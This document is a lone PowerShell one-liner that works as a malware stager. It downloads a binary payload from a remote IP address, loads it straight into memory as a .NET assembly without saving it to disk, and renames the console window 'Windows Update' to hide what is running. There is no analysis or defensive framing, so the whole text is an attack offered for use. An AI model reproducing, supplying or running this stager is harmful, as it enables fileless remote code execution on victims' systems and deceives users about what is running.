$StageBytes = (New-Object System.Net.WebClient).DownloadData("https://198.51.100.92/payload.bin"); [Reflection.Assembly]::Load($StageBytes); $Host.UI.RawUI.WindowTitle = "Windows Update"
